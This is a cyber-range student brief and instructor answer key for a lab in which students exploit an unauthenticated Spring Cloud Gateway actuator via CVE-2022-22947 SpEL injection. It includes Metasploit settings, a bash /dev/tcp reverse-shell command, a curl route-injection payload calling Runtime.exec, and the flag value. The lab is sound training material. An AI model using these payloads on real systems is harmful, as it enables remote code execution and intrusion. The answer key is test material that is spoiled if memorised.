# Houston Student Brief

## General Instructions

On this subnet, `.254` is the lab router and is out of bounds.

The following docker containers are available to you as pre-installed tools helpful for the labs. Additional details are in the README.txt file on the Kali desktop.

- JavaChains

## Assigned Subnet

`192.168.11.0/24`

## Objective

From your assigned operations station, discover the host on the assigned subnet, gain appropriate access, and collect the flag.

The flag is obvious once you reach it. It is not intentionally hidden or obfuscated.

## Deliverable

Record the flag value for Houston.

## PCTE range limitations

These limits apply on Persistent Cyber Training Environment (PCTE) ranges used by this Module. Treat the items below as a no-strike list when they exist. Not every item is present on every range or host.

Do not target, block, terminate, or delete range-control artifacts:

- **Network:** `10.0.0.0/8` (range control and instrumentation; do not block or flag that traffic). Routers past the edge-router in grey space. TCP `5672` (AMQP user-emulation on the control subnet), `49998`, and `49999`.
- **Accounts:** `range-admin` / `range_admin`, `range-control`, and `range`. Do not use accounts whose username or password contains `simspace`.
- **User emulation:** do not stop it. Typical paths: `C:\Program Files (x86)\Simspace\` and `C:\Users\<Username>\Simspace`. Scripts: `run-actuation.cmd`, `ueactuation.cmd`.
- **Directories:** `C:\Program Files\Puppet Labs` and the Simspace paths above.
- **Processes:** `java.exe`, `javaw.exe`, `ruby.exe`, `rubyw.exe`, `start.exe`, `chromedriver.exe`, `IEDriverServer.exe`, Metova, Selenium, WebDriver.

# Houston — Instructor Answer Key

## Objective and starting context

Students start on the assigned operations station with only the city codename and subnet `192.168.11.0/24`. They must discover the live host, gain access, and recover the flag. The live instructor walkthrough is in this file.

Do not give students the service name, CVE, or host IP.

## Flag / reference table

|Item|Value|
|---|---|
|City|Houston|
|Assigned subnet|`192.168.11.0/24`|
|Deploy flag key|`T2_FLAG`|
|Default flag|`cobalt-viper`|
|Flag location on target|`/flag.txt` after access|

Rotate `T2_FLAG` in `environments/pcte_vulnhub_targets/.env` and restart the matching container when the class needs a new value. Grade against the live `.env` value, not only the default in this table.

## Initial situational awareness

Establish ops-station context before touching the assigned subnet. These commands are first-use literacy for this Module: run the full set, then interpret.

```
date -u
hostname
whoami
id
pwd
echo "$SHELL"
uname -a
cat /etc/os-release
who
w
ps aux
ss -tulpen
ss -tunap
ip a
ip -4 route
```

Why this matters:

- `date -u` and `hostname` fix remote time and host identity before any later log or packet evidence.
- `whoami`, `id`, `pwd`, and `echo "$SHELL"` lock user, session, and interpreter context.
- `uname -a` and `/etc/os-release` capture OS/runtime version.
- `who` / `w` and `ps aux` show active users and a process baseline.
- `ss -tulpen` (listeners) and `ss -tunap` (active sockets) give the required TCP+UDP picture.
- `ip -4 route` and `ip route get 192.168.11.10` show that the assigned subnet is already reachable via the default gateway.

Expected findings:

- The student is on the operations station (hostname `ops`), not on the city target. The shell is `zsh`.
- `ip -4 addr` shows the lab-facing address on `eth1` (this deployment: `172.16.123.100/24`). The `eth0` address `10.10.123.100/16` is not the path to this city subnet.
- `ip route get 192.168.11.10` uses the default gateway (this deployment: `via 172.16.123.253 dev eth1 src 172.16.123.100`). Do not add a route via `192.168.100.254`. That next hop does not answer, and a more-specific route would hide the working default path.
- Listening sockets on the ops station are local tooling, not the target. `ss` shows SSH and the local JavaChains listener on `8011/tcp`.

## Instructor live walkthrough

### Objective and starting context

Live instructor demo for the Houston Module (`B02.M10`). Students know only the assigned subnet `192.168.11.0/24`. On this range, `.254` is the lab router on the segment and is out of bounds. Do not open with the product name, CVE, or host IP.

This walkthrough is rewritten onto the `192.168.11.0/24` student-facing range. Example host addresses in later steps use the `.10` (and, where present, `.11`) convention from the shared stack; treat those as discovered values, not pre-briefed facts.

The deploy flag key is `T2_FLAG`. Confirm the live `.env` value before grading.

### Required Tools

- `iproute2` (for `ip route get`. This ops station already has a path, so do not add a static route)
- `nmap` (for host discovery, port scanning, and `http-enum`)
- `curl` (for web enumeration, actuator interaction, and exploit delivery)
- `python3` (pretty-print actuator JSON)
- `nc` (Netcat, for catching the reverse shell)
- `metasploit-framework` (section 4 automated path via `exploit/linux/http/spring_cloud_gateway_rce`)

### 1. Network Routing & Host Discovery

At the start of this scenario, we only know the target subnet: `192.168.11.0/24`. The operations station is on `172.16.123.0/24` (`eth1`). The city subnet is reached through the default gateway.

Confirm the path before scanning. `ip route get` prints the next hop and the source address the kernel will use:

```
ip route get 192.168.11.10
```

_Output:_

```
192.168.11.10 via 172.16.123.253 dev eth1 src 172.16.123.100 uid 1000
    cache
```

**Observation:** The subnet is already reachable. The source address is `172.16.123.100`.

**Inference:** Do not run `ip route add 192.168.11.0/24 via 192.168.100.254`. `192.168.100.254` does not answer on this range, and that more-specific route would override the working default path.

With connectivity available, find which addresses on the subnet actually answer. `nmap -sn` is a ping sweep: it checks host up/down and **does not** port-scan. That is cheaper than a full TCP scan of every IP, and we only have a subnet so far — we still need live hosts before we care about services.

```
nmap -sn -n 192.168.11.0/24
```

_Why `-n`:_ skip reverse DNS. The ops station resolver (`172.16.123.253`) refuses DNS. Without `-n`, this sweep sits at full CPU and does not print hosts. With `-n`, the same sweep finishes in a few seconds.

_Output excerpt:_

```
Nmap scan report for 192.168.11.10
Host is up.
Nmap scan report for 192.168.11.11
Host is up.
Nmap scan report for 192.168.11.254
Host is up.
```

**Observation:** Three hosts respond on this subnet: **192.168.11.10**, **192.168.11.11**, and **192.168.11.254**. `192.168.11.1` does not.

**Inference:** The student brief marks `.254` as the lab router and out of bounds. Enumerate both workload addresses. Neither `.10` nor `.11` is obviously the application yet.

### 2. Service Enumeration

We have two candidate IPs. Next question: **what is listening on each, and what does it claim to be?** That takes a version scan, not another ping sweep.

```
nmap -Pn -sV -n -p- 192.168.11.10 192.168.11.11
```

_Why these options:_

- `-Pn` — skip nmap’s host-discovery probes. We already know both addresses responded to `-sn`. This also keeps the scan going if a host later ignores ping but still serves TCP.
- `-n` — skip reverse DNS, same reason as the sweep. The resolver still refuses.
- `-sV` — version detection. An open port labeled only `http` is not enough; we need the product string (here, **nginx 1.13.2** on both).
- `-p-` — all 65535 TCP ports, not nmap’s default top 1000. **8080** on `.10` would be easy to miss on a top-ports-only scan (default top 1000 includes 80, not always 8080).
- Two IPs on one command — same scan twice; one table instead of two copy-paste runs.

_Output excerpt:_

```
Nmap scan report for 192.168.11.10
PORT     STATE SERVICE VERSION
8080/tcp open  http    nginx 1.13.2

Nmap scan report for 192.168.11.11
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.13.2
```

**Observation:** Both hosts appear to speak HTTP via **nginx 1.13.2**, but on different ports (`8080` vs `80`).

**Inference:** Either both are independent nginx servers, or one is proxying to the other and the version scan is seeing the upstream banner. Fetch both roots before committing to an exploit path.

#### Initial Web Probing — Both Hosts Look the Same

nmap told us HTTP on **80** and **8080**. Confirm that with a normal GET — headers and body. This is ordinary recon `curl`, not an exploit.

```
curl -s -D - http://192.168.11.11/ -o /tmp/t2-11-root.html | head -12
curl -s -D - http://192.168.11.10:8080/ -o /tmp/t2-10-root.html | head -12
```

_Why this `curl`:_

- `-s` — silent; drop the progress meter.
- `-D -` — write response **headers** to stdout (`Server`, `ETag`, status).
- `-o /tmp/t2-…-root.html` — write the **body** to a file so headers and HTML stay separated.
- `| head -12` — only the first header lines.
- Use **`:8080`** on `.10` because that is the listener nmap found (not 80). `.11` is on 80, so no port in the URL.

You can also open both URLs in a browser; the visible page is the same.

_Header excerpt (both hosts — matching `ETag` and `Server: nginx/1.13.2`):_

```
HTTP/1.1 200 OK
Server: nginx/1.13.2
Content-Type: text/html
ETag: "6a455f1a-3bf"
```

_Body excerpt (both hosts):_

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Example Domain</title>
```

**Observation:** A normal browser-style `GET /` returns the same "Example Domain" HTML from **192.168.11.11:80** and **192.168.11.10:8080**, including the same `ETag`.

**Inference:** The two boxes are not independent sites with unrelated content. Port 8080 is likely serving (or proxying) the same origin as port 80. A `GET` request alone is not enough to pick the exploitation target.

#### Failed Attempt: Trusting `GET /` to Separate the Hosts

Because both roots return the same page, it is tempting to treat **192.168.11.11** as the only real web server and ignore **192.168.11.10**.

_What we learned:_ Identical `GET` bodies can hide a second HTTP stack sitting in front of a static upstream. We need probes that exercise each host's own request handling, not just the proxied page content.

#### Differentiating the Hosts — `HEAD` Shows a Second HTTP Stack

Use `HEAD` against the root. Unlike `GET`, this does not retrieve the page body and exposes how each server handles the request internally:

```
curl -s -I http://192.168.11.11/
curl -s -I http://192.168.11.10:8080/
```

_Why `-I`:_ `curl -I` sends **HEAD** and prints response headers only (`-s` still drops the progress meter). We already have the HTML; we want whether each stack answers HEAD the same way it answers GET.

_Output for 192.168.11.11:_

```
HTTP/1.1 200 OK
Server: nginx/1.13.2
Content-Type: text/html
```

_Output for 192.168.11.10:_

```
HTTP/1.1 404 Not Found
Content-Type: application/json
```

**Observation:** `HEAD /` succeeds on the nginx host but returns a JSON `404` from port 8080. Port 8080 is therefore doing something different from a plain static file server — but `application/json` alone could be Node, Go, Python, or Java. We do not yet know the framework.

**Inference:** Port 8080 has its own HTTP/API layer behind the proxied `GET` responses. Next, try to retrieve that layer's error body and find paths it handles itself.

#### Failed Attempt: `GET` on an Unmapped Path

A natural follow-up is to request a path that should not exist and read the error body:

```
curl -s http://192.168.11.10:8080/doesnotexist | head -5
curl -s http://192.168.11.11/doesnotexist | head -5
```

_Output excerpt (both hosts):_

```
<html>
<head><title>404 Not Found</title></head>
<body bgcolor="white">
<center><h1>404 Not Found</h1></center>
```

**Observation:** Ordinary `GET` requests to unmapped paths still return nginx HTML on **both** hosts.

_What we learned:_ Many `GET` requests on port 8080 are still being forwarded to the upstream nginx origin, so this probe does not surface the JSON-speaking backend. We need a request that the front-end stack answers itself.

#### Surfacing the Backend Error Body — Non-`GET` Requests

`HEAD /` already told us the backend prefers JSON for some requests. Send a non-`GET` method to a path that is unlikely to be proxied:

```
curl -s -X PUT http://192.168.11.10:8080/internal-probe
curl -s -X PUT http://192.168.11.11/internal-probe | head -5
```

_Why `-X PUT`:_ `-X` sets the HTTP method. nginx on `.11` typically allows GET/HEAD for static files and returns **405** for PUT. A gateway/API layer often answers unknown methods itself instead of forwarding them. `internal-probe` is an arbitrary path we do not expect to exist.

_Output for 192.168.11.10:_

```
{
    "timestamp": "2026-10-08T17:04:50.238+00:00",
    "path": "/internal-probe",
    "status": 404,
    "error": "Not Found",
    "message": null,
    "requestId": "b2fa8ec7-10"
}
```

`timestamp` and `requestId` change on every request. The field names, `path`, `status`, and `error` are the stable part.

_Output excerpt for 192.168.11.11:_

```
<html>
<head><title>405 Not Allowed</title></head>
<body bgcolor="white">
<center><h1>405 Not Allowed</h1></center>
```

**Observation:** Only port 8080 returns a structured JSON error with `timestamp`, `path`, `status`, `error`, and `requestId` fields. **192.168.11.11** still answers with nginx HTML.

**Inference:** Port 8080 is running its own application layer behind the proxied `GET` responses, but we still do not know the framework. The next step is to enumerate paths on **192.168.11.10:8080** and see what management or API surfaces are exposed.

#### Enumerating Paths on Port 8080

Run a generic HTTP path enumeration script against the interesting host:

```
nmap -Pn -p 8080 --script http-enum 192.168.11.10
```

_Why this nmap:_

- `-Pn` — same as before; skip host discovery.
- `-p 8080` — only the listener we care about (this is path brute-force, not another full-port scan).
- `--script http-enum` — NSE script that probes a list of common HTTP paths (admin, actuator, manager, and so on) and reports hits. It is ordinary directory recon, not an exploit.

_Output excerpt:_

```
| http-enum:
|   /actuator/: Spring Boot Actuator endpoint
```

**Observation:** The scanner reports a **Spring Boot Actuator** endpoint at `/actuator`. That is the first concrete framework clue — port 8080 is not just a reverse proxy; it is a Spring Boot application with a management API.

**Inference:** Follow the `/actuator` lead on **192.168.11.10** and enumerate what that management surface exposes. Confirm whether **192.168.11.11** also has it.

#### Investigating Spring Boot Actuator

The scanner named **Spring Boot Actuator** at `/actuator`. A student who has not seen that stack before can look it up with what was just discovered:

_Search:_ `spring boot actuator /actuator`

That leads to the official docs ([Actuator Endpoints](https://docs.spring.io/spring-boot/reference/actuator/endpoints.html)): Spring Boot commonly exposes operational and health endpoints under `/actuator`. Confirm the path manually and inspect the response headers:

```
curl -s -D - -o /dev/null http://192.168.11.10:8080/actuator | head -10
curl -s -o /dev/null -w '192.168.11.11 /actuator -> HTTP %{http_code}\n' \
  http://192.168.11.11/actuator
```

_Why the second `curl`:_ `-o /dev/null` discards the body; `-w '…%{http_code}\n'` prints only the status so we can see `.11` is **404** without dumping HTML.

_Output:_

```
HTTP/1.1 200 OK
Content-Type: application/vnd.spring-boot.actuator.v3+json
Content-Length: 2008

192.168.11.11 /actuator -> HTTP 404
```

**Observation:** Actuator responds only on **192.168.11.10**, with the Spring Boot actuator v3 media type. The earlier JSON error fields (`timestamp`, `path`, `status`, `error`, `requestId`) also match Spring Boot's default error JSON — searchable as `spring boot json error timestamp path status requestId` ([Error Responses](https://docs.spring.io/spring-boot/reference/web/servlet.html#web.servlet.spring-mvc.error-handling)). **192.168.11.11** has no actuator surface and can be treated as the static nginx upstream.

List the exposed actuator links. The full JSON is long (~100+ pretty-printed lines), so show the top of the document and then search for unusual endpoints:

```
curl -s -D  http://192.168.11.10:8080/actuator -o /tmp/actuator.html
cat /tmp/actuator.html | python3 -m json.tool | head -n 40
cat /tmp/actuator.html | python3 -m json.tool | grep -n -A2 '"gateway"'
```

_Why store content, pretty-print then grep:_

- `-o /tmp/actuator.html` — run commands once and then parse locally for optimal OPSEC
- `python3 -m json.tool` — indent the actuator `_links` object so each key sits on its own line. Compact JSON is one long line and is hard to scan by eye.
- `grep -n -A2 '"gateway"'` — look for a link named **`gateway`** (quoted so we match the JSON key, not a random substring). `-n` prints the line number; `-A2` is two lines after the match so the `href` is visible. We grep for `gateway` because Spring Cloud Gateway’s actuator API is a known extra link on `/actuator`; `health` / `info` are expected on any Boot app.

_Head excerpt:_

```
{
    "_links": {
        "self": {
            "href": "http://192.168.11.10:8080/actuator",
            "templated": false
        },
        "beans": {
            "href": "http://192.168.11.10:8080/actuator/beans",
            "templated": false
        },
        "health": {
            "href": "http://192.168.11.10:8080/actuator/health",
            "templated": false
        },
        "info": {
            "href": "http://192.168.11.10:8080/actuator/info",
            "templated": false
        },
        ...
```

_Grep excerpt:_

```
91:        "gateway": {
92-            "href": "http://192.168.11.10:8080/actuator/gateway",
93-            "templated": false
```

**Observation:** Alongside common endpoints such as `health` and `info`, there is a **`gateway`** link.

**Inference:** Searching with the newly observed path — `spring boot actuator /actuator/gateway` — points to **Spring Cloud Gateway** and its management API ([Spring Cloud Gateway Actuator API](https://docs.spring.io/spring-cloud-gateway/reference/spring-cloud-gateway-server-webflux/actuator-api.html)). That product identity also explains the earlier behavior: an API gateway on **192.168.11.10:8080** proxying many `GET` requests to the nginx origin on **192.168.11.11**.

Verify health and whether route management is readable without authentication:

```
curl -s http://192.168.11.10:8080/actuator/health | python3 -m json.tool
curl -s -o /tmp/actuator_routes.html -w 'GET /actuator/gateway/routes -> HTTP %{http_code}\n' \
  http://192.168.11.10:8080/actuator/gateway/routes
```

_Output:_

```
{
    "status": "UP"
}
```

```
GET /actuator/gateway/routes -> HTTP 200
```

```
cat /tmp/actuator_routes.html | python3 -m json.tool
```

_Output:_

```
[
    {
        "predicate": "Methods: [GET]",
        "route_id": "index",
        "filters": [],
        "uri": "http://example.com:80",
        "order": 0
    }
]
```

**Observation:** The gateway is healthy, and `/actuator/gateway/routes` is enabled and exposed without authentication. The only baseline route is `index`: GET, no filters, forwarded to `[http://example.com:80](http://example.com:80)`. A route whose filter already shows `AddResponseHeader Result = 'root'` is leftover exploit state, not this baseline.

**Target selection:** **192.168.11.10** is the application tier to attack — Spring Cloud Gateway with an exposed gateway actuator. **192.168.11.11** is the static nginx upstream and can be set aside.

Spring Cloud Gateway's actuator API can also create, delete, and refresh routes when left unrestricted ([Actuator API](https://docs.spring.io/spring-cloud-gateway/reference/spring-cloud-gateway-server-webflux/actuator-api.html)). With the product and exposed gateway actuator known, a vulnerability search such as `Spring Cloud Gateway actuator RCE` or `Spring Cloud Gateway SpEL injection` surfaces public advisories describing **SpEL injection through route filters** when the gateway actuator is enabled and unsecured ([CVE-2022-22947](https://tanzu.vmware.com/security/cve-2022-22947)).

**What the bug is:** Gateway routes can include filters such as `AddResponseHeader`. Filter arguments are not only static strings. In vulnerable versions, a value written as a Spring Expression Language fragment (`#{ ... }`) is **evaluated on the server** when the gateway reloads routes. SpEL can construct Java types (`T(java.lang.Runtime)`), call `getRuntime().exec(...)`, and capture stdout. The actuator `POST /actuator/gateway/routes/{id}` endpoint is how an unauthenticated client **writes** that filter. `POST /actuator/gateway/refresh` is how the gateway **loads** it. After refresh, `GET` of the same route shows the evaluated result in the stored filter definition.

### 3. Automated Path: Metasploit

Product + confirmed unauthenticated gateway endpoint is enough to look for an existing exploit. In `msfconsole`:

```
msf6 > search spring_cloud_gateway

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/linux/http/spring_cloud_gateway_rce  2022-01-26       excellent  Yes    Spring Cloud Gateway Remote Code Execution
```

(The same module is also findable with `search cve:2022-22947`.) Use it with a **bash reverse shell** payload — the module default (`cmd/unix/python/meterpreter/reverse_tcp`) assumes Python on the target, which this container does not provide.

```
msfconsole -q
```

```
msf6 > use exploit/linux/http/spring_cloud_gateway_rce
msf6 exploit(linux/http/spring_cloud_gateway_rce) > set RHOSTS 192.168.11.10
msf6 exploit(linux/http/spring_cloud_gateway_rce) > set RPORT 8080
msf6 exploit(linux/http/spring_cloud_gateway_rce) > set LHOST 172.16.123.100
msf6 exploit(linux/http/spring_cloud_gateway_rce) > set LPORT 4444
msf6 exploit(linux/http/spring_cloud_gateway_rce) > set TARGET 0
msf6 exploit(linux/http/spring_cloud_gateway_rce) > set PAYLOAD cmd/unix/reverse_bash
msf6 exploit(linux/http/spring_cloud_gateway_rce) > run
```

_Why these options:_ `RHOSTS` / `RPORT` are the gateway we enumerated (`.10:8080`, not the nginx upstream). `LHOST` is the `src` address from `ip route get 192.168.11.10`. Do not use `192.168.100.1`. `TARGET 0` is Unix in-memory. `PAYLOAD cmd/unix/reverse_bash` matches a Java container that has bash but not Python.

_Output excerpt:_

```
[*] Started reverse TCP handler on 172.16.123.100:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Route deleted
[+] The target is vulnerable.
[*] Command shell session 1 opened (172.16.123.100:4444 -> 192.168.11.10:46388)
[+] Route deleted
```

The source port (`46388` on this run) changes. There can be a delay between the session opening and an interactive shell.

`Route deleted` does not always leave the gateway clean. List routes after the session and delete any id other than `index`, then refresh:

```
curl -s http://192.168.11.10:8080/actuator/gateway/routes
curl -s -X DELETE http://192.168.11.10:8080/actuator/gateway/routes/<id>;
curl -s -X POST http://192.168.11.10:8080/actuator/gateway/refresh
```

The leftover id changes each run (`wtdfmqyw` on this pass). Its filter shows `AddResponseHeader Result = 'root\n'`. While that route remains, `HEAD /` on port 8080 returns **500** instead of the JSON **404**.

In the session:

```
id
date -u
hostname
whoami
ip a
ip r
pwd
echo "$SHELL"
ps -ef
uname -a
cat /etc/os-release
who
w
ss -tulpen
ss -tunap
find / -iname *flag.txt
cat /flag.txt
```

_Output:_

```
uid=0(root) gid=0(root) groups=0(root)
97784a2b9001
default via 192.168.11.254 dev eth0
192.168.11.0/24 dev eth0 proto kernel scope link src 192.168.11.10
cobalt-viper
```

**Note:** `ps` is not installed. `command -v ps` prints nothing. The container id from `hostname` changes across runs (`97784a2b9001` on this pass). The in-container default route is via `192.168.11.254`.

That is a complete automated path to the flag. Section 5 is the same SpEL route injection without Metasploit.

### 4. Manual Path: SpEL reverse shell

With command execution confirmed via the `id` probe, escalate to an interactive reverse shell. Reuse the same actuator route-injection technique, but call `Runtime.exec()` with a reverse-shell command instead of capturing `id` into a response header.

Start a Netcat listener on your attacker machine (use your IP on the lab-facing LAN; example below uses `172.16.123.100`):

```
nc -lvnp 4444
```

Prepare the callback address and reverse-shell command:

```
LHOST="172.16.123.100"   # src from: ip route get 192.168.11.10
LPORT="4444"
REVCMD="bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
```

#### Failed Attempt: String-Based `Runtime.exec()`

A common mistake is passing the entire reverse shell as a single string:

```
T(java.lang.Runtime).getRuntime().exec("/bin/bash -c 'bash -i >& /dev/tcp/172.16.123.100/4444 0>&1'")
```

That often fails to open a shell.

_What we learned:_ Java's `Runtime.exec(String)` tokenizes on spaces and breaks the bash `-c` argument. Use the `String[]` form (`exec(new String[]{"/bin/bash", "-c", "..."})`) so the shell command is passed intact. The successful `id` probe already used the array form.

The reverse-shell SpEL expression is:

```
#{T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash","-c","<REVCMD>"})}
```

We do not need `StreamUtils` here: we are not reading stdout back into a header. The process is a callback to Netcat.

Inject the malicious route and refresh:

```
curl -s -X POST http://192.168.11.10:8080/actuator/gateway/routes/revshell \
  -H 'Content-Type: application/json' \
  -d "{
  \"id\": \"revshell\",
  \"filters\": [{
    \"name\": \"AddResponseHeader\",
    \"args\": {
      \"name\": \"Result\",
      \"value\": \"#{T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"/bin/bash\\\",\\\"-c\\\",\\\"$REVCMD\\\"})}\"
    }
  }],
  \"uri\": \"http://example.com\"
}"

curl -s -X POST http://192.168.11.10:8080/actuator/gateway/refresh
```

Check the Netcat listener. You should receive a root shell:

```
listening on [any] 4444 ...
connect to [172.16.123.100] from (UNKNOWN) [192.168.11.10] 46388
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@97784a2b9001:/#
```

The source port and the container id in the prompt change across runs. The peer address is the city host.

This is **remote code execution** as root through Spring Cloud Gateway SpEL injection.

From the reverse shell (or the Metasploit session in section 4):

```
cat /flag.txt
```

_Output:_

```
cobalt-viper
```

After gaining access, remove the malicious route:

```
curl -s -X DELETE http://192.168.11.10:8080/actuator/gateway/routes/revshell
curl -s -X POST http://192.168.11.10:8080/actuator/gateway/refresh
```

Target 2 is complete.

## Troubleshooting / confirmation

- If the subnet does not respond, confirm the stack is up and `ip route get 192.168.11.10` still uses the default gateway. Do not add a route via `192.168.100.254`.
- If `nmap -sn` never prints hosts, rerun it with `-n`.
- If the session does not connect, set `LHOST` to the `src` address from `ip route get 192.168.11.10`, not `192.168.100.1`.
- If `HEAD /` on `.10:8080` returns 500, list `/actuator/gateway/routes` and delete every id other than `index`, then refresh.
- If the recovered string does not match this table, read the live `T2_FLAG` from `.env` before marking the quiz wrong.
- If students name a CVE or product before they have service evidence, redirect them to host discovery and version output.
- The city subnet for this module is `192.168.11.0/24`. The ops-station address can change with DHCP; take `LHOST` from `ip route get`, not from a remembered `172.16.123.100`.

## Grading checkpoints

|Checkpoint|Acceptable evidence|
|---|---|
|Assigned subnet used|Student worked `192.168.11.0/24` (or the live remapped equivalent)|
|Host discovered|Live host identified from a subnet sweep, not from a handed IP|
|Access gained|Command or session evidence that reached the target filesystem|
|Flag submitted|Quiz value matches live `T2_FLAG` (default `cobalt-viper`)|

Accept a correct live flag even if the student used a valid alternate exploit path. Do not award the quiz for a walkthrough dump without the flag.